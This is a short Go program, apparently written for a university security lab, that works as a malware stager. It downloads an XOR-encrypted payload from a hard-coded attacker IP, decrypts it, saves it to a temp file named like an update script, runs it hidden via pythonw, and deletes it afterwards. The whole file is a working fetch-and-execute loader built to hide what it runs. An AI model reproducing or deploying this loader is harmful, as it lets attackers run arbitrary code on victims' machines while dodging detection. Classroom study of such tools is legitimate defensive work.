package main

import (
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

const host = "195.0.1.5" // Cambiar por IP real de Parrot
const port = "8080"

var key = []byte("SecurityUTalca2026")

func xor(data, k []byte) []byte {
	out := make([]byte, len(data))
	for i, b := range data {
		out[i] = b ^ k[i%len(k)]
	}
	return out
}

func main() {
	resp, err := http.Get("http://" + host + ":" + port + "/payload")
	if err != nil {
		return
	}
	defer resp.Body.Close()

	enc, err := io.ReadAll(resp.Body)
	if err != nil {
		return
	}

	code := xor(enc, key)

	tmp, err := os.CreateTemp("", "upd*.py")
	if err != nil {
		return
	}
	tmpPath := tmp.Name()
	tmp.Write(code)
	tmp.Close()

	cmd := exec.Command("pythonw", tmpPath)
	cmd.Start()

	// Espera un momento y borra el archivo temporal
	go func() {
		cmd.Wait()
		os.Remove(tmpPath)
	}()
}
